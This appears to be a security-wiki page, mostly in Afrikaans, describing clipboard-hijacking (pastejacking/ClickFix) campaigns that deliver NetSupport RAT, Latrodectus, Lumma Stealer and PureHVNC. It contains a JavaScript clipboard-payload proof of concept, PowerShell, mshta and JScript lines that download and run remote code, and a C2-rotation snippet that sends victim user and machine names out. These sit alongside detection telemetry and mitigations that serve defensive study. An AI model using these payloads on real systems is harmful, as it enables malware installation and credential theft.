# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldende advies

## Oorsig

Clipboard hijacking – also known as *pastejacking* – misbruik die feit dat gebruikers gewoonlik opdragte kopieer-en-plak sonder om dit te inspekteer. 'n Kwaadaardige webblad (of enige JavaScript-ondersteunende konteks soos 'n Electron- of Desktop-toepassing) plaas programmaties deur 'n aanvaller beheerde teks in die stelselklembord. Slagoffers word gewoonlik aangemoedig, meestal deur sorgvuldig saamgestelde social-engineering-instruksies, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of 'n terminal te open en die klembordinhoud *plak*, wat dadelik willekeurige opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen aanhangsel oopgemaak word nie**, omseil die tegniek die meeste e-pos- en webinhoud-sekuriteitskontroles wat aanhangsels, macros of direkte opdraguitvoering monitor. Die aanval is daarom populêr in phishing-veldtogte wat alledaagse malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## JavaScript Bewys-van-Konsep
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik, nuwer vertrou op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Die ClickFix / ClearFake-proses

1. Gebruiker besoek 'n typosquatted of compromised site (bv. `docusign.sa[.]com`)
2. Ingespuite **ClearFake** JavaScript roep 'n `unsecuredCopyToClipboard()` helper aan wat stilweg 'n Base64-encoded PowerShell one-liner in die klembord stoor.
3. HTML-instruksies vertel die slagoffer om: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` voer uit en laai 'n argief af wat 'n wettige uitvoerbare lêer plus 'n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die loader decrypts additional stages, injects shellcode and installs persistence (e.g. scheduled task) – uiteindelik running NetSupport RAT / Latrodectus / Lumma Stealer.

### Voorbeeld NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (wettige Java WebStart) soek sy gids vir `msvcp140.dll`.
* Die kwaadwillige DLL los dinamies API's op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met 'n rollende XOR-sleutel `"https://google.com/"`, injekteer die finale shellcode en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader binne **cscript.exe** uit
3. Haal 'n MSI payload af → plaas `libcef.dll` langs 'n gesigneerde toepassing → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-aanroep lanseer 'n verborge PowerShell-skrip wat `PartyContinued.exe` aflaai, `Boat.pst` (CAB) uitpak, `AutoIt3.exe` herbou deur `extrac32` en lêerkonkatenasie, en uiteindelik 'n `.a3x`-skrip uitvoer wat browser credentials na `sumeriavgv.digital` exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-campagnes slaan lêeraflaaie heeltemal oor en beveel slagoffers aan om 'n eenreël-opdrag te plak wat JavaScript via WSH aflaai en uitvoer, dit laat voortbestaan, en die C2 daagliks roteer. Voorbeeld van 'n waargenome ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Belangrike kenmerke
- Verdoezelde URL omgekeer tydens runtime om oppervlakkige inspeksie te ontduik.
- JavaScript maak homself persistent via Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.

Minimale JS-fragment wat gebruik word om C2s volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die volgende fase ontplooi gewoonlik 'n loader wat persistensie vestig en 'n RAT (e.g., PureHVNC) aflaai, dikwels pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Opstart-artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met 'n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU en command‑line telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin payloads om lang skripte te voer sonder lang opdragreëls.
- Geskeduleerde take wat daarna LOLBins uitvoer soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` onder 'n updater‑agtige taak/pad (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks roterende C2-hostname(s) en URL's met die patroon `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korreleer clipboard write events gevolg deur Win+R-plak en dan onmiddellike `powershell.exe` uitvoering.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou 'n geskiedenis van **Win + R** opdragte – kyk vir abnormale Base64 / obfuscated inskrywings.
* Security Event ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** vir lêerskeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688‑gebeurtenis.
* EDR clipboard sensors (indien teenwoordig) – korreleer `Clipboard Write` gevolg onmiddellik deur 'n nuwe PowerShell‑proses.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) of vereis 'n gebruikergebaar.
2. Security awareness – leer gebruikers om *type* sensitiewe opdragte of eers in 'n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om willekeurige one-liners te blokkeer.
4. Network controls – blokkeer uitgaande versoeke na bekende pastejacking en malware C2‑domeine.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Verwysings

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
